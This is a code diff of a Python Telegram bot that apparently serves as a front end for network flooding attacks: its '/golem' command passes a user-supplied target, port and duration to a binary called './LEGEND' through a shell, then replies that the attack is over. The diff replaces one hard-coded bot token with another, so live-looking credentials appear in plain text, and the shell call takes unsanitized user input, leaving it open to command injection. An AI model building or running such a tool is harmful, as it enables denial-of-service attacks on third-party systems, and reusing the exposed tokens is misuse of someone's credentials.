@@ -8,7 +8,7 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7242024865:AAFD6SVsYkfQP-l7Gv5DTtYd7tQp-iFSxGc')
+bot = telebot.TeleBot('7685282015:AAHnlFcY4XvoY8mtZtJ863rJ8ML0MwGGmUQ')
 
 # Admin user IDs
 admin_id = ["7584228621"]
@@ -315,7 +315,7 @@ def handle_golem(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./LEGEND {target} {port} {time}"
                 process = subprocess.run(full_command, shell=True)
-                response = f"{username}𝗔𝗧𝗧𝗔𝗖𝗞 𝗞𝗛𝗧𝗠 𝗛𝗢𝗚𝗬𝗔 𝗔𝗕 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 𝗕𝗛𝗘𝗝 𝗪𝗔𝗥𝗡𝗔 𝗗𝗜𝗦𝗔𝗣𝗣𝗥𝗢𝗩𝗘 𝗛𝗢𝗡𝗘 𝗞𝗘 𝗟𝗜𝗔 𝗥𝗘𝗔𝗗𝗬 𝗥𝗘𝗛\n\n{target}\n\n{port}\n\n{time}"
+                response = f"𝗔𝗧𝗧𝗔𝗖𝗞 𝗞𝗛𝗧𝗠 𝗛𝗢𝗚𝗬𝗔 𝗔𝗕 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 𝗕𝗛𝗘𝗝 𝗪𝗔𝗥𝗡𝗔 𝗗𝗜𝗦𝗔𝗣𝗣𝗥𝗢𝗩𝗘 𝗛𝗢𝗡𝗘 𝗞𝗘 𝗟𝗜𝗔 𝗥𝗘𝗔𝗗𝗬 𝗥𝗘𝗛\n\n{target}\n\n{port}\n\n{time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
             response = "✅ Usage :- /golem <target> <port> <time>"  # Updated command syntax
